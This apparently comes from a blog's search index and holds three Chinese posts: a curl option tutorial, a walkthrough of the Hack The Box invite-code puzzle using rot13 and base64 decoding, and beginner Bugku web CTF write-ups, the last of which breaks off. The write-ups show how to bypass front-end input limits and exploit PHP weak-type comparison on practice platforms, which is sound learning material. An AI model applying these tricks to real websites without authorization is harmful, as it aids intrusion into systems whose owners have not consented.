<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>curl的使用</title>
    <url>/posts/25992/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。</p>
<p>我们可以不借助一些额外安装的工具或者插件，通过curl命令就可以完成一些我们日常的工作。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/somethings/curl1121.png"></p>
<p>不带有任何参数时，curl 就是发出 GET 请求。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令向<code>www.example.com</code>发出 GET 请求，服务器返回的内容会在命令行输出。</p>
<h2 id="A"><a href="#A" class="headerlink" title="-A"></a><strong>-A</strong></h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会移除<code>User-Agent</code>标头。</p>
<p>也可以通过<code>-H</code>参数直接指定标头，更改<code>User-Agent</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;User-Agent: php/1.0&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="b"><a href="#b" class="headerlink" title="-b"></a><strong>-b</strong></h2><p><code>-b</code>参数用来向服务器发送 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo=bar&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo1=bar;foo2=bar2&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令发送两个 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p>
<h2 id="c"><a href="#c" class="headerlink" title="-c"></a><strong>-c</strong></h2><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -c cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p>
<h2 id="d"><a href="#d" class="headerlink" title="-d"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d<span class="string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ curl -d <span class="string">&#x27;login=emma&#x27;</span> -d <span class="string">&#x27;password=123&#x27;</span> -X POST  https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>
<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;@data.txt&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>
<h2 id="–data-urlencode"><a href="#–data-urlencode" class="headerlink" title="–data-urlencode"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>
<h2 id="e"><a href="#e" class="headerlink" title="-e"></a><strong>-e</strong></h2><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -e <span class="string">&#x27;https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p>
<p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Referer: https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="F"><a href="#F" class="headerlink" title="-F"></a><strong>-F</strong></h2><p><code>-F</code>参数用来向服务器上传二进制文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>
<p><code>-F</code>参数可以指定 MIME 类型。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>
<p><code>-F</code>参数也可以指定文件名。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>
<h2 id="G"><a href="#G" class="headerlink" title="-G"></a><strong>-G</strong></h2><p><code>-G</code>参数用来构造 URL 的查询字符串。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G -d <span class="string">&#x27;q=kitties&#x27;</span> -d <span class="string">&#x27;count=20&#x27;</span> https://google.com/search</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>
<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="H"><a href="#H" class="headerlink" title="-H"></a><strong>-H</strong></h2><p><code>-H</code>参数添加 HTTP 请求的标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> -H <span class="string">&#x27;Secret-Message: xyzzy&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加两个 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>
<h2 id="i"><a href="#i" class="headerlink" title="-i"></a><strong>-i</strong></h2><p><code>-i</code>参数打印出服务器回应的 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -i https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。</p>
<h2 id="I"><a href="#I" class="headerlink" title="-I"></a><strong>-I</strong></h2><p><code>-I</code>参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -I https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令输出服务器对 HEAD 请求的回应。</p>
<p><code>--head</code>参数等同于<code>-I</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --head https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="k"><a href="#k" class="headerlink" title="-k"></a><strong>-k</strong></h2><p><code>-k</code>参数指定跳过 SSL 检测。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -k https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令不会检查服务器的 SSL 证书是否正确。</p>
<h2 id="L"><a href="#L" class="headerlink" title="-L"></a><strong>-L</strong></h2><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -L -d <span class="string">&#x27;tweet=hi&#x27;</span> https://api.twitter.com/tweet</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="–limit-rate"><a href="#–limit-rate" class="headerlink" title="–limit-rate"></a><strong>–limit-rate</strong></h2><p><code>--limit-rate</code>用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --limit-rate 200k https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将带宽限制在每秒 200K 字节。</p>
<h2 id="o"><a href="#o" class="headerlink" title="-o"></a><strong>-o</strong></h2><p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -o example.html https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p>
<h2 id="O"><a href="#O" class="headerlink" title="-O"></a><strong>-O</strong></h2><p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -O https://www.example.com/foo/bar.html</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>
<h2 id="s"><a href="#s" class="headerlink" title="-s"></a><strong>-s</strong></h2><p><code>-s</code>参数将不输出错误和进度信息。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p>
<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="S"><a href="#S" class="headerlink" title="-S"></a><strong>-S</strong></h2><p><code>-S</code>参数指定只输出错误信息，通常与<code>-s</code>一起使用。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -S -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令没有任何输出，除非发生错误。</p>
<h2 id="u"><a href="#u" class="headerlink" title="-u"></a><strong>-u</strong></h2><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob:12345&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>
<p>curl 能够识别 URL 里面的用户名和密码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://bob:12345@google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p>
<h2 id="v"><a href="#v" class="headerlink" title="-v"></a><strong>-v</strong></h2><p><code>-v</code>参数输出通信的整个过程，用于调试。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -v https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --trace - https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="x"><a href="#x" class="headerlink" title="-x"></a><strong>-x</strong></h2><p><code>-x</code>参数指定 HTTP 请求的代理。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>
<p>如果没有指定代理协议，默认为 HTTP。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令中，请求的代理使用 HTTP 协议。</p>
<h2 id="X"><a href="#X" class="headerlink" title="-X"></a><strong>-X</strong></h2><p><code>-X</code>参数指定 HTTP 请求的方法。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -X POST https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p>
<h2 id="T"><a href="#T" class="headerlink" title="-T"></a>-T</h2><p><code>-T</code>参数可以用于请求体文件</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -T <span class="string">&quot;&#123;file1,file2&#125;&quot;</span> http://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<br>

<br>

<br>

<p>本篇博文基于阮一峰的网络日志进行修改和补充</p>
<p>阮一峰大大的传送门：<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
]]></content>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack The Box账号注册</title>
    <url>/posts/33946/</url>
    <content><![CDATA[<h3 id="hack-the-box-是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面我们一起来愉快的注册一次吧"><a href="#hack-the-box-是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面我们一起来愉快的注册一次吧" class="headerlink" title="hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面我们一起来愉快的注册一次吧~"></a>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面我们一起来愉快的注册一次吧<del>~</del></h3><hr>
<h4 id="打开网站注册的时候，提示需要自己入侵网站获取注册"><a href="#打开网站注册的时候，提示需要自己入侵网站获取注册" class="headerlink" title="打开网站注册的时候，提示需要自己入侵网站获取注册"></a>打开网站注册的时候，提示需要自己入侵网站获取注册</h4><p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg"></p>
<h4 id="在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字"><a href="#在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字" class="headerlink" title="在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字"></a>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</h4><p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png"></p>
<h4 id="跑去查看js文件源码"><a href="#跑去查看js文件源码" class="headerlink" title="跑去查看js文件源码"></a>跑去查看js文件源码</h4><p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png"></p>
<h4 id="发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试"><a href="#发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试" class="headerlink" title="发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~"></a>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</h4><p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png"></p>
<h4 id="给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看"><a href="#给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看" class="headerlink" title="给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看"></a>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>





<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png"></p>
<h3 id="解密结果："><a href="#解密结果：" class="headerlink" title="解密结果："></a>解密结果：</h3><h4 id="In-order-to-generate-the-invite-code-make-a-POST-request-to-api-invite-generate"><a href="#In-order-to-generate-the-invite-code-make-a-POST-request-to-api-invite-generate" class="headerlink" title="In order to generate the invite code, make a POST request to /api/invite/generate"></a>In order to generate the invite code, make a POST request to /api/invite/generate</h4><p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png"></p>
<h4 id="返回一段被base64方式加密的密文，我们再次跑去解密base64"><a href="#返回一段被base64方式加密的密文，我们再次跑去解密base64" class="headerlink" title="返回一段被base64方式加密的密文，我们再次跑去解密base64"></a>返回一段被base64方式加密的密文，我们再次跑去解密base64</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>





<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png"></p>
<h4 id="这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！"><a href="#这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！" class="headerlink" title="这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！"></a>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</h4>]]></content>
  </entry>
  <entry>
    <title>bugku平台web题目~持续更新中！（新手推荐）</title>
    <url>/posts/55334/</url>
    <content><![CDATA[<ol>
<li><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>打开页面，是一群会动的滑稽，还越动越快，哈哈哈</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/6YPR%25%7B%40PNPA%5BNUEN%7BBW6VGQ.png"></p>
<p>好啦，看起来页面给不出什么有用的信息，我们查看一下源代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/7%60CZ6H%24XMN37HSV%40%5BKG%40%60YW.png"></p>
<p>发现flag，通关！</p>
</li>
<li><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>进入环境后，发现给出一串数字计算，但怎么也输入不了超过两位数的数字，只能输入一位</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/R%60T%5B%60G~%24KK_4G73~~FWC%40YY.png"></p>
<p>猜测是前端限制，打开后，修改1数值为2，就可以输入两位数字了，然后提交获取flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/%28RKID%60YAVX1ZTCXS9%7B3%7D~KU.png"></p>
<p>当然，还有另一种方法，就是去找他的js文件，找了一下，发现flag了</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/51MY%5B%7DSCM%29%60XKFO4SI8Z3%7DM.png"></p>
</li>
<li><h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p>看题目也知道是get方式发送请求，打开后看页面给出的代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/UZAL7ME3%7BJQ7OQ%7BCE1VC193.png"></p>
<p>查看代码，告诉我们传参给what，当传的参数值为flag，输出flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/YINKR%28%29%7BP6602C3PPQ%60C%7B15.png"></p>
<p>ok,获取到flag。</p>
</li>
<li><h2 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h2><p>这次要求我们使用post方式传参</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/J%7B4QX%29%5DODJBTH%257%25PJZVRH2.png"></p>
<p>和上道题目一样，需要对what参数传参flag回显答案，但我们不是使用get方式，而是使用post方式进行请求</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/UI%259OG4%7D99JEQ%7D4QQB%24U_S1.png"></p>
<p>回显flag，通关。</p>
</li>
<li><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>打开题目，查看给出的代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/WM9ZE87%29%7BBW9%25ERIN9%7BW%248Y.png"></p>
<p>依然用get方式对参数num传值，但这次多了一个<strong>is_numeric()函数</strong>和一个<strong>if判断</strong>。</p>
<blockquote>
<p>isnumeric( )还是一个很实用的函数，在算法题目里面应该会有比较大的作用。</p>
<p>检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False。</p>
</blockquote>
<p>同时我们还需要知道php的弱类型比较，例如’123a’会被转换成’123’,字符串的开头部分决定了它的值。如果该字符串以合法的数字开始，则使用该数字至和他连续的最后一个数字结束，否则其比较时整体值为0。</p>
<p>所以我们既要满足第一个不是纯数字又要数值上等于1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/OO%7D2%40M0%4076CCULY%5D3GNA%40QL.png"></p>
<p>成功，获取flag。</p>
</li>
<li><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>打开题目环境，有一个弹框，一直点都一直弹出，f12点不开开发者工具，所以我们直接url请求查看源代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/%25WTF6%5D64VA%2846%5DGK7~%5B6%7BAM.png"></p>
<p>拉到底下，发现一串unicode编码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/S3AKL%5BJ%40%296T%25Z%5BWB8CAS7IC.png"></p>
<p>把它转成Ascii码即可解密获取flag呦</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/K%7DOPCINA9JMUUT6NFY1IT71.png"></p>
</li>
<li><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>题目提示我们解析域名</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/HK%5DCS7TD%60%5BU9_SC%60H3%28%7B%25FE.png"></p>
<p>按照题目要求把flag.baidu.com解析到123.206.87.240，所以我们在本地的hosts文件里写入</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%5D4%28BG%28N5%7DD%28Y%40KWWD~ISX~B.png"></p>
<p>再访问flag.baidu.com即可得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/BC%5BB1EG9A%5D%7BSO%28%5DTKKV%605Z7.png"></p>
</li>
<li><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面，是一个不停刷新的画面</p>
